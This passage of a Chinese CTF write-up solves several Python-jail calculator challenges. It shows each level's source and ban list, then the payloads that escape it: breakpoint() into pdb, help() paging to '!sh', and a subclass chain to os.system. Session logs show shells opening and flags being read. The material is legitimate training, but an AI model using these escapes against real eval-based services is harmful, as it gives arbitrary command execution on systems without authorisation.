class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i!r&#125;</span> has been banned for security reasons&#x27;</span>)<br>            exit(<span class="hljs-number">0</span>)<br><br>WELCOME = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  _                _                           _       _ _ _                _ ___    _____ </span><br><span class="hljs-string"> | |              (_)                         (_)     (_) | |              | |__ \  | ____|</span><br><span class="hljs-string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| |  ) | | |__  </span><br><span class="hljs-string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | |/ _ \ \ / / _ \ | / /  |___ \ </span><br><span class="hljs-string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |/ /_ _ ___) |</span><br><span class="hljs-string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)____/ </span><br><span class="hljs-string">              __/ |                          _/ |                                          </span><br><span class="hljs-string">             |___/                          |__/                                                                                                            </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(WELCOME)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Welcome to the python jail&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)<br>input_data = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br><span class="hljs-built_in">filter</span>(input_data)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(input_data)&gt;<span class="hljs-number">13</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Oh hacker!&quot;</span>)<br>    exit(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">eval</span>(input_data)))<br><br></code></pre></td></tr></table></figure><p>限制长度不大于13，且ban掉了 exec，input，eval</p><p>经过查阅发现可以使用breakpoint()函数进入pdb调试模式，先用step进入模块，可以说使用list检查代码，发现内容被input_data变量接收</p><p>对其进行赋值。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs py"> nc node5.anna.nssctf.cn <span class="hljs-number">28031</span><br><br>  _                _                           _       _ _ _                _ ___    _____<br> | |              (_)                         (_)     (_) | |              | |__ \  | ____|<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| |  ) | | |__<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | |/ _ \ \ / / _ \ | / /  |___ \<br> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |/ /_ _ ___) |<br> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)____/<br>              __/ |                          _/ |<br>             |___/                          |__/<br><br><br>Welcome to the python jail<br>Let<span class="hljs-string">&#x27;s have an beginner jail of calc</span><br><span class="hljs-string">Enter your expression and I will evaluate it for you.</span><br><span class="hljs-string">&gt; breakpoint()</span><br><span class="hljs-string">--Return--</span><br><span class="hljs-string">&gt; &lt;string&gt;(1)&lt;module&gt;()-&gt;None</span><br><span class="hljs-string">(Pdb) step</span><br><span class="hljs-string">Answer: None</span><br><span class="hljs-string">--Return--</span><br><span class="hljs-string">&gt; /home/ctf/server.py(34)&lt;module&gt;()-&gt;None</span><br><span class="hljs-string">-&gt; print(&#x27;</span>Answer: &#123;&#125;<span class="hljs-string">&#x27;.format(eval(input_data)))</span><br><span class="hljs-string">(Pdb) list</span><br><span class="hljs-string"> 29     input_data = input(&quot;&gt; &quot;)</span><br><span class="hljs-string"> 30     filter(input_data)</span><br><span class="hljs-string"> 31     if len(input_data)&gt;13:</span><br><span class="hljs-string"> 32         print(&quot;Oh hacker!&quot;)</span><br><span class="hljs-string"> 33         exit(0)</span><br><span class="hljs-string"> 34  -&gt; print(&#x27;</span>Answer: &#123;&#125;<span class="hljs-string">&#x27;.format(eval(input_data)))</span><br><span class="hljs-string">[EOF]</span><br><span class="hljs-string">(Pdb) input_data</span><br><span class="hljs-string">&#x27;</span><span class="hljs-built_in">breakpoint</span>()<span class="hljs-string">&#x27;</span><br><span class="hljs-string">(Pdb) input_data=__import__(&#x27;</span>os<span class="hljs-string">&#x27;).system(&#x27;</span>sh<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">sh: 0: can&#x27;</span>t access tty; job control turned off<br>$ ls<br>flag  server.py<br>$ cat flag<br>flag=NSSCTF&#123;<span class="hljs-number">70489431</span>-119a-4fd3-96ac-f8abbd07c7e1&#125;<br>$<br></code></pre></td></tr></table></figure><h4 id="calc-jail-beginner-level3"><a href="#calc-jail-beginner-level3" class="headerlink" title="calc_jail_beginner_level3"></a>calc_jail_beginner_level3</h4><p><a href="https://cheatsheet.haax.fr/linux-systems/programing-languages/python/#pyjail-generate-a-shell">Offensive Security Cheatsheet (haax.fr)</a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/env python3</span><br>WELCOME = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  _                _                           _       _ _   _                _ ____  </span><br><span class="hljs-string"> | |              (_)                         (_)     (_) | | |              | |___ \ </span><br><span class="hljs-string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | __) |</span><br><span class="hljs-string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ ||__ &lt; </span><br><span class="hljs-string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |___) |</span><br><span class="hljs-string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____/ </span><br><span class="hljs-string">              __/ |                          _/ |                                     </span><br><span class="hljs-string">             |___/                          |__/                                                                                       </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(WELCOME)<br><span class="hljs-comment">#the length is be limited less than 7</span><br><span class="hljs-comment">#it seems banned some payload </span><br><span class="hljs-comment">#Can u escape it?Good luck!</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Welcome to the python jail&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)<br>input_data = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(input_data)&gt;<span class="hljs-number">7</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Oh hacker!&quot;</span>)<br>    exit(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">eval</span>(input_data)))<br><br><br></code></pre></td></tr></table></figure><p>  由于限定大小不大于7，那么之前的payload就不行了。查看大佬的wp，发现在python交互式终端中，可以使用help函数来进行rce</p><p>入交互式后，随便查询一种用法，由于太多，会使用more进行展示，造成溢出，在后面使用!命令即可造成命令执行。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">help</span>()<br><br>Welcome to Python <span class="hljs-number">3.8</span><span class="hljs-string">&#x27;s help utility!</span><br><span class="hljs-string"></span><br><span class="hljs-string">If this is your first time using Python, you should definitely check out</span><br><span class="hljs-string">the tutorial on the Internet at https://docs.python.org/3.8/tutorial/.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Enter the name of any module, keyword, or topic to get help on writing</span><br><span class="hljs-string">Python programs and using Python modules.  To quit this help utility and</span><br><span class="hljs-string">return to the interpreter, just type &quot;quit&quot;.</span><br><span class="hljs-string"></span><br><span class="hljs-string">To get a list of available modules, keywords, symbols, or topics, type</span><br><span class="hljs-string">&quot;modules&quot;, &quot;keywords&quot;, &quot;symbols&quot;, or &quot;topics&quot;.  Each module also comes</span><br><span class="hljs-string">with a one-line summary of what it does; to list the modules whose name</span><br><span class="hljs-string">or summary contain a given string such as &quot;spam&quot;, type &quot;modules spam&quot;.</span><br><span class="hljs-string"></span><br><span class="hljs-string">help&gt; modules</span><br></code></pre></td></tr></table></figure><p>输入!sh就可以进入shell里面</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">help</span>&gt; re<br>Help on module re:<br><br>NAME<br>    re - Support <span class="hljs-keyword">for</span> regular expressions (RE).<br><br>MODULE REFERENCE<br>    https://docs.python.org/<span class="hljs-number">3.8</span>/library/re<br><br>    The following documentation <span class="hljs-keyword">is</span> automatically generated <span class="hljs-keyword">from</span> the Python<br>    source files.  It may be incomplete, incorrect <span class="hljs-keyword">or</span> include features that<br>    are considered implementation detail <span class="hljs-keyword">and</span> may vary between Python<br>    implementations.  When <span class="hljs-keyword">in</span> doubt, consult the module reference at the<br>    location listed above.<br><br>DESCRIPTION<br>    This module provides regular expression matching operations similar to<br>    those found <span class="hljs-keyword">in</span> Perl.  It supports both <span class="hljs-number">8</span>-bit <span class="hljs-keyword">and</span> Unicode strings; both<br>    the pattern <span class="hljs-keyword">and</span> the strings being processed can contain null <span class="hljs-built_in">bytes</span> <span class="hljs-keyword">and</span><br>    characters outside the US ASCII <span class="hljs-built_in">range</span>.<br><br>    Regular expressions can contain both special <span class="hljs-keyword">and</span> ordinary characters.<br>    Most ordinary characters, like <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;0&quot;</span>, are the simplest<br>    regular expressions; they simply <span class="hljs-keyword">match</span> themselves.  You can<br>--More--<br>    concatenate ordinary characters, so last matches the string <span class="hljs-string">&#x27;last&#x27;</span>.<br>--More--! sh<br>! sh<br>------------------------<br>--More--!sh<br>!sh<br>------------------------<br>--More--!ls<br>!ls<br>flag  server.py<br>------------------------<br>--More--!cat flag<br>!cat flag<br>flag=NSSCTF&#123;c96135fd-<span class="hljs-number">8475</span>-48df-9a6e-238520cb33ec&#125;<br></code></pre></td></tr></table></figure><h4 id="calc-jail-beginner-level4"><a href="#calc-jail-beginner-level4" class="headerlink" title="calc_jail_beginner_level4"></a>calc_jail_beginner_level4</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#No danger function,no chr,Try to hack me!!!!</span><br><span class="hljs-comment">#Try to read file ./flag</span><br><br><br>BANLIST = [<span class="hljs-string">&#x27;__loader__&#x27;</span>, <span class="hljs-string">&#x27;__import__&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;chr&#x27;</span>]<br><br>eval_func = <span class="hljs-built_in">eval</span><br><br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> BANLIST:<br>    <span class="hljs-keyword">del</span> __builtins__.__dict__[m]<br><br><span class="hljs-keyword">del</span> __loader__, __builtins__<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter</span>(<span class="hljs-params">s</span>):<br>    not_allowed = <span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;&quot;\&#x27;`&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">any</span>(c <span class="hljs-keyword">in</span> not_allowed <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s)<br><br>WELCOME = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  _                _                           _       _ _   _                _ _  _   </span><br><span class="hljs-string"> | |              (_)                         (_)     (_) | | |              | | || |  </span><br><span class="hljs-string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_ </span><br><span class="hljs-string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _|</span><br><span class="hljs-string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |  </span><br><span class="hljs-string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_|  </span><br><span class="hljs-string">              __/ |                          _/ |                                      </span><br><span class="hljs-string">             |___/                          |__/                                                                                                                                             </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(WELCOME)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Welcome to the python jail&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)<br>input_data = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">filter</span>(input_data):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Oh hacker!&quot;</span>)<br>    exit(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(eval_func(input_data)))<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">禁用了<span class="hljs-built_in">chr</span>函数导致不能使用字符拼接，禁用了<span class="hljs-built_in">__import__</span>导致了<span class="hljs-built_in">help</span>()以及<span class="hljs-built_in">breakpoint</span>()不能使用。<br></code></pre></td></tr></table></figure><p>但是这里可以使用bytes函数以及deocode函数</p><p>bytes 函数可以接收一个 ascii 列表，然后转换为二进制字符串，再调用 decode 则可以得到字符串</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">bytes</span>([<span class="hljs-number">115</span>, <span class="hljs-number">121</span>, <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">101</span>, <span class="hljs-number">109</span>]).decode() <br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">().__class__.__base__.__subclasses__()[-<span class="hljs-number">4</span>].__init__.__globals__[<span class="hljs-built_in">bytes</span>([<span class="hljs-number">115</span>,<span class="hljs-number">121</span>,<span class="hljs-number">115</span>,<span class="hljs-number">116</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>]).decode()](<span class="hljs-built_in">bytes</span>([<span class="hljs-number">115</span>,<span class="hljs-number">104</span>]).decode()<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs py">nc node5.anna.nssctf.cn <span class="hljs-number">28711</span><br><br>  _                _                           _       _ _   _                _ _  _<br> | |              (_)                         (_)     (_) | | |              | | || |<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _|<br> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |<br> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_|<br>              __/ |                          _/ |<br>             |___/                          |__/<br><br><br>Welcome to the python jail<br>Let<span class="hljs-string">&#x27;s have an beginner jail of calc</span><br><span class="hljs-string">Enter your expression and I will evaluate it for you.</span><br><span class="hljs-string">&gt; ().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115,121,115,116,101,109]).decode()](bytes([115,104]).decode())</span><br><span class="hljs-string">sh: 0: can&#x27;</span>t access tty; job control turned off<br>$ cat flag<br>flag=NSSCTF&#123;4f4a6110-<span class="hljs-number">7705</span>-4ddb-b6d3-b9448d1651b0&#125;<br></code></pre></td></tr></table></figure><h4 id="calc-jail-beginner-level4-0-5"><a href="#calc-jail-beginner-level4-0-5" class="headerlink" title="calc_jail_beginner_level4.0.5"></a>calc_jail_beginner_level4.0.5</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs py"> nc node5.anna.nssctf.cn <span class="hljs-number">28903</span><br><br>  _                _                           _       _ _   _                _ _  _    ___   _____<br> | |              (_)                         (_)     (_) | | |              | | || |  / _ \ | ____|<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_| | | || |__<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _| | | ||___ \<br> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_| |_| | ___) |<br> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)\___(_)____/<br>              __/ |                          _/ |<br>             |___/                          |__/<br><br><br>Welcome to the python jail<br>Let<span class="hljs-string">&#x27;s have an beginner jail of calc</span><br><span class="hljs-string">Enter your expression and I will evaluate it for you.</span><br><span class="hljs-string">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals and `,&quot;,&#x27;</span> Good luck!<br>&gt;<br></code></pre></td></tr></table></figure><p>没有给源码，但是有提示，与上一个相同。</p><h4 id="calc-jail-beginner-level4-1"><a href="#calc-jail-beginner-level4-1" class="headerlink" title="calc_jail_beginner_level4.1"></a>calc_jail_beginner_level4.1</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs py"> nc node5.anna.nssctf.cn <span class="hljs-number">28800</span><br><br>  _                _                           _       _ _   _                _ _  _  __<br> | |              (_)                         (_)     (_) | | |              | | || |/_ |<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_| |<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _| |<br> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_| |<br> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)_|<br>              __/ |                          _/ |<br>             |___/                          |__/<br><br><br>Welcome to the python jail<br>Let<span class="hljs-string">&#x27;s have an beginner jail of calc</span><br><span class="hljs-string">Enter your expression and I will evaluate it for you.</span><br><span class="hljs-string">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes and `,&quot;,&#x27;</span> Good luck!<br></code></pre></td></tr></table></figure><p>依然没有源码，但是bytes被ban了，那么从类中找到第六个 &lt;class ‘bytes_iterator’&gt;</p><p>那么构造bytes ：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">().__class__.__base__.__subclasses__()[<span class="hljs-number">6</span>]<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs py">nc node5.anna.nssctf.cn <span class="hljs-number">28800</span><br><br>  _                _                           _       _ _   _                _ _  _  __<br> | |              (_)                         (_)     (_) | | |              | | || |/_ |<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_| |<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _| |<br> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_| |<br> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)_|<br>              __/ |                          _/ |<br>             |___/                          |__/<br><br><br>Welcome to the python jail<br>Let<span class="hljs-string">&#x27;s have an beginner jail of calc</span><br><span class="hljs-string">Enter your expression and I will evaluate it for you.</span><br><span class="hljs-string">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes and `,&quot;,&#x27;</span> Good luck!<br>&gt; ().__class__.__base__.__subclasses__()[-<span class="hljs-number">4</span>].__init__.__globals__[().__class__.__base__.__subclasses__()[<span class="hljs-number">6</span>]([<span class="hljs-number">115</span>, <span class="hljs-number">121</span>, <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">101</span>, <span class="hljs-number">109</span>]).decode()](().__class__.__base__.__subclasses__()[<span class="hljs-number">6</span>]([<span class="hljs-number">115</span>, <span class="hljs-number">104</span>]).decode())<br>sh: <span class="hljs-number">0</span>: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ cat flag</span><br><span class="hljs-string">cat: flag: No such file or directory</span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">flag_y0u_CaNt_FiNd_mE  server.py</span><br><span class="hljs-string">$ cat flag_y0u_CaNt_FiNd_mE</span><br><span class="hljs-string">flag=NSSCTF&#123;d68bd386-1f8c-4a42-83a7-077253f3bfb7&#125;</span><br><span class="hljs-string">$</span><br></code></pre></td></tr></table></figure><h4 id="calc-jail-beginner-level4-2"><a href="#calc-jail-beginner-level4-2" class="headerlink" title="calc_jail_beginner_level4.2"></a>calc_jail_beginner_level4.2</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs py">nc node5.anna.nssctf.cn <span class="hljs-number">28502</span><br><br>  _                _                           _       _ _   _                _ _  _   ___<br> | |              (_)                         (_)     (_) | | |              | | || | |__ \<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_   ) |<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _| / /<br> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_ / /_<br> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)____|<br>              __/ |                          _/ |<br>             |___/                          |__/<br><br><br><br>Welcome to the python jail<br>Let<span class="hljs-string">&#x27;s have an beginner jail of calc</span><br><span class="hljs-string">Enter your expression and I will evaluate it for you.</span><br><span class="hljs-string">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,byte and `,&quot;,&#x27;</span>,+ Good 